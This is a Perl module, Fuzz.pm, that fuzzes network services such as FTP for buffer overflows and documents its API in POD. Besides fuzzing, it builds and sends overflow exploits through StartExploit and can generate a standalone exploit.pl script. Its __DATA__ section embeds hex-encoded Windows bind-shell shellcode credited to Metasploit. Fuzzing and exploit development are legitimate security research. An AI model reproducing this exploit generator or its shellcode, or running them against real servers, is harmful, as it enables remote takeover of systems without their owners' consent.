package Fuzz;

use strict;
use warnings;

use IO::Socket;
use Class::Accessor::Fast;
use Carp qw(carp cluck confess);

our @ISA     = qw(IO::Socket Class::Accessor::Fast Carp);
our $VERSION = '0.06';

# @toFuzz объявлен глобальной переменной модуля для последующего использования в функциях репортинга
my @toFuzz;

__PACKAGE__->mk_accessors(
	qw(RemoteAddr
	  RemotePort
	  FuzzLevel
	  Socket
	  Debug
	  Letters
	  Numbers
	  Formats
	  ActionCmd
	  ActionExit
	  ActionTemplate
	  AuthUser
	  AuthPass
	  AuthSuccess
	  AuthTemplate
	  ExploitTemplate
	  ExploitShellcode
	  ExploitLength
	  ExploitCategory
	  ExploitNeedLogin
	  ExploitShellcodeDescription)
);

sub new {
	my $class = shift || __PACKAGE__;

	my $self;

# Обрабатываем сокращенный вариант входных параметров ( new('host:port') )
	if ( scalar @_ == 1 ) {
		( $self->{RemoteAddr}, $self->{RemotePort} ) = split( ':', shift );
	}
	else { $self = {@_} }

# Проверяем наличие обязательных параметров
	foreach (qw(RemoteAddr RemotePort)) {
		confess $_ . " was not cofigured" unless $self->{$_};
	}

# Служебные аттрибуты
	$self->{_LastSentFinger} = undef;
	$self->{_ProtoPreset}    = undef;
	$self->{_ReportData}     = [];
	$self->{_Start}          = undef;
	$self->{_Stop}           = undef;

#	Аттрибуты фаззера
	$self->{FuzzLevel} ||= 1;
	$self->{Debug}     ||= 0;

# Задаем начальные данные статически чтобы ускорить инициализацию фаззера
# Новые категории и данные для них могут быть добавлены по мере необходимости с помощью соотвествующих методов
# Для новых категорий данные будут генерироваться через модуль Data::Generator

	$self->{Letters} ||= {
		_data => [
			'A' x 128,
			'A' x 256,
			'A' x 512,
			'A' x 1024,
			'A' x 2048,
			'A' x 4096,
			'A' x 10000
		],
		_example => qr/(\w{1})/
	};
	$self->{Formats} ||= {
		_data => [
			'%s' x 1024,
			'%s' x 4096,
			'%s' x 10000,
			'%x' x 1024,
			'%x' x 4096,
			'%x' x 10000,
			'%n' x 1024,
			'%n' x 4096,
			'%n' x 10000
		],
		_example => qr/(%\w{1})/
	};
	$self->{Numbers} ||= {
		_data => [
			-1, -0.1, -0.0001, -10000, scalar '-1' . '0' x 64,
			1, 0.1, 0.0001, 10000, scalar '1' . '0' x 64
		],
		_example => qr/(\d{1)}/
	};

#	Проверка соответствия типов и содержимого входных параметров
	foreach (qw(Letters Formats Numbers)) {
		confess "$_ must be HASHREF" unless ref $self->{$_} eq 'HASH';
		confess "$_ must consist of two keys: '_data' and '_example'"
		  unless exists $self->{$_}->{_data} || exists $self->{$_}->{_example};
	}

# Формируем спискок команд доступных по тестируемому протоколу
# Две категории: авторизация и взаимодействие
# Категорию логин можно опустить, категория взаимодействие - обязательна

	$self->{ActionCmd}  ||= [];
	$self->{ActionExit} ||= undef;
	$self->{ActionTemplate} = undef;

	$self->{AuthUser}     ||= undef;
	$self->{AuthPass}     ||= undef;
	$self->{AuthSuccess}  ||= undef;
	$self->{AuthTemplate} ||= undef;

# Предуставновленные настройки для распространенных протоколов
# TODO Сделать возможность ручного добавления пресета
	$self->{PresetFtp}  = sub { $self->_LoadPresetFTP };
	$self->{PresetHttp} = sub { $self->_LoadPresetHTTP };
	$self->{PresetPop3} = sub { $self->_LoadPresetPOP3 };
	$self->{PresetSmtp} = sub { $self->_LoadPresetSMTP };

# Заполняем данные для эксплоитинга
# Необходимые данные: шеллкод, длина строки переполнения, тип переполнения, флаг посылки логина

#	Считываем шеллкод из секции __DATA__
	chomp( my $sh = <DATA> );
	
	$self->{ExploitTemplate} ||= undef;
	$self->{ExploitNeedLogin}            ||= 0;
	$self->{ExploitShellcode}            ||= qq{};
	$self->{ExploitLength}               ||= undef;
	$self->{ExploitCategory}             ||= undef;
	$self->{ExploitShellcodeDescription} ||=
	  'win32_bind -  EXITFUNC=seh LPORT=1337 Size=344 Encoder=PexFnstenvSub';

	$self->{Socket} = IO::Socket::INET->new(
		PeerAddr => $self->{RemoteAddr},
		PeerPort => $self->{RemotePort}
	  )
	  || confess 'Connection failed';
	$self->{Socket}->autoflush(1);

	bless( $self, ref $class || $class );
}

# Главная функция (экcпортируется)
sub StartFuzzing {
	my $self = shift;

	$self->_CheckParams(qw(ActionCmd ActionTemplate));

# Формируем списки для фаззинга в зависимости от глубины проверки

#	Указание типов фаззинга по именам
	if ( ref $self->FuzzLevel eq 'ARRAY' ) {
		foreach ( @{ $self->FuzzLevel } ) {
			$self->$_
			  ? push( @toFuzz, $_ )
			  : cluck $_
			  . ' data category not found, fuzzing could not be continued';
		}
	}

#  Указание типов фаззинга по уровню глубины проверки
	else {
		@toFuzz = qw(Letters);
		push( @toFuzz, 'Formats' )
		  if int $self->FuzzLevel >= 2;
		push( @toFuzz, 'Numbers' )
		  if int $self->FuzzLevel >= 3;
		if ( int $self->FuzzLevel >= 4 ) {
			@toFuzz = ();
			foreach ( keys %{ $self->FuzzData } ) {
				next if /^Letters|Formats|Numbers$/;
				push( @toFuzz, $_ );
			}
		}
	}

	my ( $category, $string, $cmd, $toSend, $buf );

#	Фиксируем время начала проверки
	$self->{_Start} = scalar localtime;

# TODO Разделить посылку логина и пароля

#  Проверка процедуры авторизации на переполнения
	if ( $self->AuthTemplate ) {
		$self->_DebugPrint('Starting login sequence');

		foreach $category (@toFuzz) {
			$self->_DebugPrint("Current category: $category");

			foreach $string ( @{ $self->$category->{_data} } ) {
				$toSend = $self->AuthTemplate;
				cluck 'No {CMD} in format, possible typo'
				  unless $toSend =~ s/{USER}/$string/g;
				cluck 'No {BOF} in format, possible typo'
				  unless $toSend =~ s/{PASS}/$string/g;

#          	Посылаем строку переполнения
				syswrite( $self->Socket, $toSend );

				my $len = length $string;
				$self->_DebugPrint(
					"{USER} [$len bytes] => {PASS} [$len bytes]");

#  Проверяем состояние соединения
#  Если sysread возвращает undef, сигнализируем о потере соединения

# sysread использован для упрощения проверки соединения (perlipc - UDP: Message Passing)
#  также функция использована для обхода буферизации ввода/вывода ОС ($| = 1)

				unless ( sysread( $self->Socket, $buf, 1024 ) ) {
					$self->_DebugPrint(
"Possible overflow found! Command: AUTH SEQUENCE; Length: $len; Category: $category"
					);
					$self->_AddReportData(
"Possible overflow found!<br>Command: AUTH SEQUENCE; Length: $len; Category: $category"
					);

					if ( $string =~ $self->$category->{_example} ) {
						$self->{_LastSentFinger} = $1;
					}
					else {
						cluck
'Error determing last sent finger, exploitation will not be avaliable';
					}

#					Фиксируем время окончания проверки
					$self->{_Stop} = scalar localtime;

					return 1;
				}

#				Переустанавливаем соединение для сброса аутентификации
				$self->_SocketReconnect
				  || $self->_DebugPrint(
"Possible overflow found! Command: AUTH SEQUENCE; Length: $len; Format: $category"
				  )
				  && $self->_AddReportData(
"Possible overflow found!<br>Command: AUTH SEQUENCE; Length: $len; Format: $category"
				  );
			}
		}
	}

	$self->_LoginSend;

	$self->_DebugPrint('Starting action sequence');

# Проверка команд протокола на переполнения
	foreach $category (@toFuzz) {
		$self->_DebugPrint("Fuzzing $category");

		foreach $string ( @{ $self->$category->{_data} } ) {
			foreach $cmd ( @{ $self->ActionCmd } ) {
				$toSend = $self->ActionTemplate;
				cluck 'No {CMD} in AuthTemplate, possible typo'
				  unless $toSend =~ s/{CMD}/$cmd/g;
				cluck 'No {BOF} in AuthTemplate, possible typo'
				  unless $toSend =~ s/{BOF}/$string/g;

#				Посылаем строку переполнения
				syswrite( $self->Socket, $toSend );

				my $len = length $string;
				$self->_DebugPrint("{CMD} [$len bytes]");

#	Проверяем состояние соединения
#	Если sysread возвращает undef, сигнализируем о потере соединения

# sysread использован для упрощения проверки соединения (perlipc - UDP: Message Passing)
#  также функция использована для обхода буферизации ввода/вывода ОС ($| = 1)

				unless ( sysread( $self->Socket, $buf, 1024 ) ) {
					$self->_DebugPrint(
"Possible overflow found! Command: $cmd; Length: $len; Category: $category"
					);
					$self->_AddReportData(
"Possible overflow found!<br>Command: $cmd; Length: $len; Category: $category"
					);
					
#					TASK Устанавливаем настройки для возможности автоматической эксплуататации (для версии 0.07)

#					$self->ExploitLength($len);
#					$self->ExploitCategory($category);

#					TODO Возможно добавить автоматическую установку шаблона эксплоита на основе анализа ActionTemplate
#					$self->ExploitTemplate('...');

#					$self->ExploitNeedLogin($self->LoginTemplate ? 1 : 0);
					if ( $string =~ $self->$category->{_example} ) {
						$self->{_LastSentFinger} = $1;
					}
					else {
						cluck
'Error determing last sent finger, exploitation will not be avaliable';
					}
					

#					Фиксируем время окончания проверки
					$self->{_Stop} = scalar localtime;

					return 1;
				}
			}
		}
	}

#	Фиксируем время окончания проверки
	$self->{_Stop} = scalar localtime;

	0;
}

# Формирование и посылка эксплоита
sub StartExploit {
	my $self = shift;

	my $cmd = shift || confess 'No command given';

# Проверяем наличие обязательных параметров
	$self->_CheckParams(qw(_LastSentFinger ExploitTemplate ExploitLength));

# {NOP} - \x90
# {CMD} - уязвимая команда
# {BOF} - строка переполнения
# {SHC} - шеллкод

	$self->_DebugPrint('Prepearing exploit');

	my ( $string, $shc, $bof ) = (
		$self->ExploitTemplate, $self->ExploitShellcode,
		$self->{_LastSentFinger} x int $self->ExploitLength
	);

	cluck 'No {BOF} in exploitTemplate, possible typo'
	  unless $string =~ s/{BOF}/$bof/g;
	cluck 'No {SHC} in exploitTemplate, possible typo'
	  unless $string =~ s/{SHC}/$shc/g;
	cluck 'No {CMD} in exploitTemplate, possible typo'
	  unless $string =~ s/{CMD}/$cmd/g;

	$string =~ s/{NOP}/\x90/g;

# Сбрасываем соединение и обмен командами по протоколу
	$self->_DebugPrint('Reconnecting to send exploit');
	$self->_SocketReconnect
	  || $self->_DebugPrint(
		'Reconnection failed, explonation could not be continued', 2 );

#	Логинимся при необходимости
	if ( $self->ExploitNeedLogin ) {
		$self->_CheckParams(qw(AuthTemplate AuthSuccess AuthUser AuthPass));
		$self->_LoginSend;
	}

	syswrite( $self->Socket, $string );

	$self->_DebugPrint('Exploit sent');
}

sub AddFuzzCategory {
	my $self = shift;

#	Проверяем доступность модуля Data::Generate
	eval  { use Data::Generate };
	if ($@) {
		cluck
'Data::Generate is not installed, custom data category could not be added';
		return;
	}

	my ( $category, $rule, $example ) = @_;

	if ( defined $rule ) {

		my $gen = Data::Generate::parse($rule)
		  || cluck 'Data::Generate: ' . $!;

		my $operation =
		  eval { $self->$category }
		  ? 'Modifieng'
		  : 'Adding';

		$self->_DebugPrint("$operation data category: $category");
		$self->{$category} = {
			_data    => $gen->get_unique_data( $gen->get_degrees_of_freedom ),
			_example => $example
		};    

		__PACKAGE__->mk_accessors($category);
	}
}

sub LoadProtocolPreset {
	my $self   = shift;
	my $preset = shift || return $self->{_ProtoPreset};

	$self->_DebugPrint("Loading preset protocol: $preset");

#	Преобразуем имя заданного пресета: первая буква - заглавная, остальные - строчные 
	my $method = $self->{ 'Preset' . ucfirst lc $preset };
	eval { $self->$method( @_ ) };
	confess "No such preset: $preset" if $@;

	1;
}

sub ExploitBuildStandalone {
	my $self = shift;

# Проверяем наличие обязательных параметров
	$self->_CheckParams(
		qw(_LastSentFinger ExploitNeedLogin ExploitLength AuthUser AuthPass AuthSuccess)
	);

	my $file        = shift || 'exploit.pl';
	my $description = shift || 'No description defined';

#	Поддержка многострочных комментариев
	$description =~ s/\n/\n# /;

	open( OUT, '>', $file ) || confess $!;

	my ( $login, $char, $len, $sh, $user, $pass, $success, $shdesc, $genDate ) =
	  (
		$self->ExploitNeedLogin, $self->{_LastSentFinger},
		$self->ExploitLength,    $self->ExploitShellcode,
		$self->AuthUser,         $self->AuthPass,
		$self->AuthSuccess,      $self->ExploitShellcodeDescription,
		scalar localtime
	  );

	my $template = $self->AuthTemplate;
	cluck 'No {USER} in AuthTemplate, possible typo'
	  unless $template =~ s/{USER}/$user/g;
	cluck 'No {PASS} in AuthTemplate, possible typo'
	  unless $template =~ s/{PASS}/$pass/g;

	print OUT qq{#!perl

##
# Exploit: $description
# Shellcode: $shdesc
##

##
# $genDate
# This code was generated by Fuzz.pm ($VERSION)
##

use strict;
use warnings;

use IO::Socket;

my \$target = shift || usage();
my \$port   = shift || usage();

my \$login   = $login;
my \$exploit = '$char' x $len;
my \$success = $success;

sendExploit();

sub sendExploit
{
    my \$sock = IO::Socket::INET -> new(PeerAddr => \$target,
                                        PeerPort => \$port)
        || die \$!;
    
    chomp(my \$shellcode = <DATA>);
    
    if(\$login)
    {
        \$sock -> send($template);
        my \$buf = \$sock -> recv(length \$success);
        die 'Login failed' unless \$buf =~ /\Q\$success\E/
    }
    
    \$sock -> send(\$exploit . \$shellcode);
    
    \$sock -> close;
    
    print 'Exploit sent';
}

sub usage
{
    exit print qq{
Usage: \$0 <host> <port>
<host> = target adress
<port> = target port

Note: exploit will try to bindshell on 31337 port
    }
}

__DATA__
$sh
    };

	close OUT;

	1;
}

sub CreateReport {
	my $self = shift;
	my $path = shift;

	eval 'use HTML::Template';
	cluck 'HTML::Template in not installed, reporting could not be continued',
	  return
	  if $@;

	open( REPORT, '>', $path ) || confess $!;
	my $report = HTML::Template->new( filename => 'report.tmpl' );

#	Заполняем шаблон отчета
	$report->param( GENERATOR => 'Fuzz.pm v' . $VERSION );
	$report->param(
		SETTINGS => [
			{ OPTION => 'Remote host', OPTVALUE => $self->RemoteAddr },
			{ OPTION => 'Remote port', OPTVALUE => $self->RemotePort },
			{
				OPTION   => 'Fuzzing deepness',
				OPTVALUE => ref $self->FuzzLevel eq 'ARRAY'
				? scalar @{ $self->FuzzLevel }
				: $self->FuzzLevel
			},
			{
				OPTION   => 'Data categories used',
				OPTVALUE => join( ',', @toFuzz ) || 'No'
			},
			{
				OPTION   => 'Protocol preset used',
				OPTVALUE => $self->LoadProtocolPreset || 'No'
			},
			{ OPTION => 'Fuzzing start time', OPTVALUE => $self->{_Start} },
			{ OPTION => 'Fuzzing stop time',  OPTVALUE => $self->{_Stop} }
		]
	);

	my ( @data, $current );
	push( @data, { DESC => $current } ) while $current = $self->_GetReportData;
	if (@data) {
		$report->param( FOUND => 1 );
		$report->param( FUZZ  => \@data );
	}

	$report->output( print_to => *REPORT );
	close REPORT;

	1;
}

# Внутренние методы модуля
sub _DebugPrint {
	my $self = shift;
	my $desc = shift;

	local $\ = "\n";

	if    ( $self->Debug == 1 ) { print $desc }
	elsif ( $self->Debug == 2 ) { carp $desc }

	1;
}

sub _AddReportData {
	my $self = shift;
	my $desc = shift;

	push( @{ $self->{_ReportData} }, $desc );

	1;
}

sub _GetReportData {
	my $self = shift;

	shift @{ $self->{_ReportData} };
}

sub _CheckParams {
	my $self   = shift;
	my @params = @_;

	my @empty;
	foreach (@params) {

#		Если текущий элемент начинается со знака нижнего подчеркивания, то это - служебный аттрибут объекта
#       в противном случае это - accessor/mutator объекта
		push( @empty, $_ ) unless defined( /^_/ ? $self->{$_} : $self->$_ );
	}

	confess join( ", ", @empty ) . ' was not configured' if @empty;
}

sub _LoginSend {
	my $self = shift;

# Авторизируемся на удаленном сервисе
#  чтобы начать тестирование по категории actionCmd
	if ( $self->AuthTemplate && $self->AuthSuccess ) {
		my ( $authRequest, $user, $pass ) =
		  ( $self->AuthTemplate, $self->AuthUser, $self->AuthPass );

		cluck 'No {USER} in AuthTemplate, possible typo'
		  unless $authRequest =~ s/{USER}/$user/g;
		cluck 'No {PASS} in AuthTemplate, possible typo'
		  unless $authRequest =~ s/{PASS}/$pass/g;

		syswrite( $self->Socket, $authRequest );

#      Получаем ответ или умираем с ошибкой
		my $buf;
		confess 'No auth response, fuzzing could not be continued'
		  unless sysread( $self->Socket, $buf, 1024 );

#		Проверяем ответ на положительность
		confess 'Authentication failed, fuzzing could not be continued'
		  unless $buf =~ $self->AuthSuccess;
	}

	1

}

sub _SocketReconnect {
	my $self = shift;

# Посылаем команду закрытия соединения для сервера при ее наличии
#  чтобы исключить возможность "подвисания" соединения или закрываем соединение со своей стороны
	if ( $self->Socket->connected ) {
		if ( $self->ActionExit ) {
			syswrite( $self->Socket, $self->ActionExit );
		}
		else { $self->Socket->close }
	}

	$self->Socket(undef);

#  Соединяемся заново
	$self->Socket(
		IO::Socket::INET->new(
			PeerAddr => $self->RemoteAddr,
			PeerPort => $self->RemotePort
		  )
		  || return
	);

#	Соединение прошло успешно
	1;
}

# Предустановленные настройки для распространенных протоколов прикладного уровня:
#  FTP, HTTP, SMTP, POP3

# TODO Доделать и протестировать все пресеты

sub _LoadPresetFTP {
	my $self = shift;
	my ( $u, $p ) = @_;

	if ( defined $u && defined $p ) {
		$self->AuthUser($u);
		$self->AuthPass($p);
	}
	else {
		$self->AuthUser('anonymous');
		$self->AuthPass('fuzz@itdefence.ru');
	}

	$self->AuthTemplate("USER {USER}\r\nPASS {PASS}\r\n");
	$self->AuthSuccess('220');
	$self->ActionTemplate("{CMD} {BOF}\r\n");
	$self->ActionCmd(
		[
			qw(CWD MKD SIZE SITE CHMOD FEAT ALLO ACCT APPE DELE LIST MODE NLST PORT REST RETR RMD RNFR RNTO STRU TYPE)
		]
	);
	$self->ActionExit('QUIT');

	$self->{_ProtoPreset} = 'FTP';

	1;
}

sub _LoadPresetHTTP {
	my $self = shift;

	#	...
	carp '_LoadPresetHTTP(): not implemented yet';
}

sub _LoadPresetSMTP {
	my $self = shift;

	#	...
	carp '_LoadPresetSMTP(): not implemented yet';
}

sub _LoadPresetPOP3 {
	my $self = shift;

	#	...
	carp '_LoadPresetPOP3(): not implemented yet';
}

1;

=head1 NAME

Fuzz - network services fuzzing interface.

=head1 VERSION

This document describes Fuzz version 0.06.

=head1 SYSNOPSIS

	use Fuzz;

	my $fuzzer = Fuzz->new(
		RemoteAddr => 'localhost',
		RemotePort => 21,
		FuzzLevel  => ['Numbers'],
		Debug => 1
	);    

	$fuzzer->AuthTemplate("USER {USER}\r\nPASS {PASS}\r\n");
	$fuzzer->AuthSuccess('220');
	$fuzzer->AuthUser('test');
	$fuzzer->AuthPass('test');

	$fuzzer->ActionCmd([qw(MKD CWD)]);
	$fuzzer->ActionExit('QUIT');
	$fuzzer->ActionTemplate("{CMD} {BOF}\r\n");

	$fuzzer->StartFuzzing;

	$fuzzer->CreateReport('report.html');

=head1 DESCRIPTION

Fuzzing is a simple technique for feeding random input to applications to reveal their
weaknesses (buffer overflows). This module provides you a quite flexable interface to
create generic fuzzers for most of application layer protocols.

=head1 METHODS

Note: there are a bunch of private module methods which are not described here.

=head2 Constructor

=head3 new(ARGS)

Creates a new Fuzz instance. Takes arguments as key=>value pairs.
Required arguments are:

=over 1

=item L<RemoteAddr|remoteaddr__scalar__>

=item L<RemotePort|remoteport__scalar__>

=back

Optional arguments are (they are described in L</Accessors/Mutators> section):

=over 1

=item L<FuzzLevel|fuzzlevel__scalar_arrayref__>

=item L<Debug|debug__scalar__>

=item L<Letters|letters__hashref__>

=item L<Numbers|numbers__hashref__>

=item L<Formats|formats__hashref__>

=item L<ActionCmd|actioncmd__arrayref__>

=item L<ActionExit|actionexit__scalar__>

=item L<ActionTemplate|actiontemplate__scalar__>

=item L<AuthUser|authuser__scalar__>

=item L<AuthPass|authpass__scalar__>

=item L<AuthSuccess|authsuccess__scalar__>

=item L<AuthTemplate|authtemplate_scalar_>

=item L<ExploitTemplate|exploittemplate__scalar__>

=item L<ExploitShellcode|exploitshellcode__scalar__>

=item L<ExploitLength|exploitlength__scalar__>

=item L<ExploitCategory|exploitcategory__scalar__>

=item L<ExploitNeedLogin|exploitneedlogin__scalar__>

=item L<ExploitShellcodeDescription|exploitshellcodedescription__scalar__>

=back

Note: RemoteAddr and RemotePort arguments can be replaced with its short form, e.g.:
C<< my $fuzzer = Fuzz->new('host:port'); >>.

Note: almost all the constructor argumets can be accessed by corresponding methods (look L</Accessors/Mutators> section).

=head2 Accessors/Mutators

Note: accessors and mutators are generated by L<http://search.cpan.org/~kawasaki/Class-Accessor-Children-0.02/lib/Class/Accessor/Children/Fast.pm> module.

=head3 RemoteAddr([SCALAR])

Gets/sets IP/host of the target network service.

=head3 RemotePort([SCALAR])

Gets/sets port number of the target service..

=head3 FuzzLevel([SCALAR|ARRAYREF])

Gets/sets fuzzing deepness level. Two types of argument can be passed: integer which indicates fuzzing
deepness and arrayref with fuzzing data categories names.
Avaliable levels:

	1 - 'Letters' only (e.g.: AAAAAA...)
	>=2 - 'Letters' and 'Formats' (e.g.: AAAAAA... and %s%s%s...)
	>=3 - 'Letters', 'Formats' and 'Numbers' (e.g.: AAAAAA...,%s%s%s... and +-100000...)

=head3 Socket([IO::Socket::INET])

Gets/sets connection descriptor.

Note: if calling as a setter, argument must be valid IO::Socket::INET object.

=head3 Debug([SCALAR])

Gets/sets Debug flag.

=head3 Letters([HASHREF])

Gets/sets 'Letters' fuzzing data category.

Note: if calling as a setter, argument must be valid hashref with 2 keys: C<< _example => ARRAYREF >>
and C<< _data => Regexp >>.

=head3 Numbers([HASHREF])

Gets/sets 'Numbers' fuzzing data category.

Note: if calling as a setter, argument must be valid hashref with 2 keys: C<< _example => ARRAYREF >>
and C<< _data => Regexp >>.

=head3 Formats([HASHREF])

Gets/sets 'Formats' fuzzing data category.
Note: if calling as a setter, argument must be valid hashref with 2 keys: C<< _example => ARRAYREF >>
and C<< _data => Regexp >>.

=head3 ActionCmd([ARRAYREF])

Gets/sets ActionCmd attribute. Note: if calling as a setter, argument must be ARRAYREF with valid
protocol commands.

=head3 ActionExit([SCALAR])

Gets/sets ActionExit attribute.

Note: if calling as a setter, argument must be valid protocol command.

=head3 ActionTemplate([SCALAR])

Gets/sets ActionTemplate attribute. Required shortcurts:

	{CMD} - currently fuzzing protocol command
	{BOF} - fuzzing data

Note: those shortcurts are required, but missing them in ActionTemplate call will not cause fatal error,
you will be just warned about possible typo.

=head3 AuthUser([SCALAR])

Gets/sets AuthUser attribute.

Note: if calling as a setter, argument must be valid remote network service username.

=head3 AuthPass([SCALAR])

Gets/sets AuthPass attribute.
Note: if calling as a setter, argument must be valid remote network service user's password.

=head3 AuthSuccess([SCALAR])

Gets/sets AuthSuccess attribute.

=head3 AuthTemplate(SCALAR)

Gets/sets AuthTemplate attribute. Required shortcurts:

	{USER} - valid username
	{PASS} - user's valid password

Note: those shortcurts are required, but missing them in AuthTemplate call will not cause fatal error,
you will be just warned about possible typo.


=head3 ExploitTemplate([SCALAR])

Gets/sets ExploitTemplate attribute. Required shortcurts:

	{CMD} - vulberable protocol command
	{BOF} - buffer overflow trigger
	{SHC} - shellcode payload

Note: those shortcurts are required, but missing them in AuthTemplate call will not cause fatal error,
you will be just warned about possible typo.

Optional shortcurts:

	{NOP} - NOP assembler instruction (\x90)

=head3 ExploitShellcode([SCALAR])

Gets/sets shellcode which will be used for exploiting.

=head3 ExploitLength([SCALAR])

Gets/sets buffer overflow trigger's length.

=head3 ExploitCategory([SCALAR])

Gets/sets buffer overflow trigger's data category.

Note: if calling as a setter, argument must be valid internal or custom defined data category.

=head3 ExploitNeedLogin([SCALAR])

Gets/sets authorization flag.

=head3 ExploitShellcodeDescription([SCALAR])

Gets/sets text description of currently used shellcode.

=head2 Other methods

=head3 StartFuzzing

Starts fuzzing process with defined preferences. No arguments needed.

=head3 StartExploit(SCALAR)

Starts exploiting process with defined preferences. Takes one required argument: vulnerable protocol command.

=head3 ExploitBuildStandalone([SCALAR], [SCALAR])

Builds standalone exploit application (perl script). Takes two optional arguments: exploit filename
('exploit.pl' by default) and exploit text description ('No description defined' by default).

Note: this method can be called only if a bug was found by C<StartFuzzing>.

=head3 AddFuzzCategory(SCALAR, SCALAR, Regexp)

Adds custom fuzzing data category. Takes three required arguments: category name, data generation rule
and one char matching regexp.

Note: this method requires L<http://search.cpan.org/~daconti/Data-Generate-0.02/lib/Data/Generate.pod> module installed.

Note: second argument must be valid L<http://search.cpan.org/~daconti/Data-Generate-0.02/lib/Data/Generate.pod#BASIC_SYNTAX> grammar rule.

Note: third argument must be valid regexp (L<http://theoryx5.uwinnipeg.ca/CPAN/perl/pod/perlop.html#regexp_quotelike_operators>) that muchs strictly one character (token) of your data.

=head3 CreateReport(SCALAR)

Creates simple HTML report on Fuzz work. Takes one required argument: report filename.

=head3 LoadProtocolPreset(SCALAR, [ARRAY])

Loads internal protocol preset. Takes one required and one optional parameter: preset name and
preset's required data. Avaliable presets:
	FTP - preset for File Transfer Protocol (optional data may be passed: username and password, on missing
	will be set to anonymous:fuzz@itdefence.ru by default).
	HTTP - preset for Hyper Text Transfer Protocol. Not implemented yet.
	SMTP - preset for Simple Mail Transfer Protocol. Not implemented yet.
	POP3 - preset for Post Office Protocol version 3. Not implemented yet.  

=head1 SEE ALSO

L<http://search.cpan.org/~daconti/Data-Generate-0.02/lib/Data/Generate.pod>

=head1 BUGS

Please report them to ksuri<AT>cpan<DOT>org.

=head1 AUTHOR

Aleksey Surikov.

=head1 COPYRIGHTS

E<copy> 2008 Aleksey Surikov (surikov<AT>itdefence<DOT>ru)
 
This program is free software; you can redistribute it and/or modify it under the same terms as Perl itself.

=cut

# (c) Metasploit Team
__DATA__
\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x80\xc8\xb8\xdf\x83\xeb\xfc\xe2\xf4\x7c\xa2\x53\x92\x68\x31\x47\x20\x7f\xa8\x33\xb3\xa4\xec\x33\x9a\xbc\x43\xc4\xda\xf8\xc9\x57\x54\xcf\xd0\x33\x80\xa0\xc9\x53\x96\x0b\xfc\x33\xde\x6e\xf9\x78\x46\x2c\x4c\x78\xab\x87\x09\x72\xd2\x81\x0a\x53\x2b\xbb\x9c\x9c\xf7\xf5\x2d\x33\x80\xa4\xc9\x53\xb9\x0b\xc4\xf3\x54\xdf\xd4\xb9\x34\x83\xe4\x33\x56\xec\xec\xa4\xbe\x43\xf9\x63\xbb\x0b\x8b\x88\x54\xc0\xc4\x33\xaf\x9c\x65\x33\x9f\x88\x96\xd0\x51\xce\xc6\x54\x8f\x7f\x1e\xde\x8c\xe6\xa0\x8b\xed\xe8\xbf\xcb\xed\xdf\x9c\x47\x0f\xe8\x03\x55\x23\xbb\x98\x47\x09\xdf\x41\x5d\xb9\x01\x25\xb0\xdd\xd5\xa2\xba\x20\x50\xa0\x61\xd6\x75\x65\xef\x20\x56\x9b\xeb\x8c\xd3\x9b\xfb\x8c\xc3\x9b\x47\x0f\xe6\xa0\xbd\xe6\xe6\x9b\x31\x3e\x15\xa0\x1c\xc5\xf0\x0f\xef\x20\x56\xa2\xa8\x8e\xd5\x37\x68\xb7\x24\x65\x96\x36\xd7\x37\x6e\x8c\xd5\x37\x68\xb7\x65\x81\x3e\x96\xd7\x37\x6e\x8f\xd4\x9c\xed\x20\x50\x5b\xd0\x38\xf9\x0e\xc1\x88\x7f\x1e\xed\x20\x50\xae\xd2\xbb\xe6\xa0\xdb\xb2\x09\x2d\xd2\x8f\xd9\xe1\x74\x56\x67\xa2\xfc\x56\x62\xf9\x78\x2c\x2a\x36\xfa\xf2\x7e\x8a\x94\x4c\x0d\xb2\x80\x74\x2b\x63\xd0\xad\x7e\x7b\xae\x20\xf5\x8c\x47\x09\xdb\x9f\xea\x8e\xd1\x99\xd2\xde\xd1\x99\xed\x8e\x7f\x18\xd0\x72\x59\xcd\x76\x8c\x7f\x1e\xd2\x20\x7f\xff\x47\x0f\x0b\x9f\x44\x5c\x44\xac\x47\x09\xd2\x37\x68\xb7\x70\x42\xbc\x80\xd3\x37\x6e\x20\x50\xc8\xb8\xdf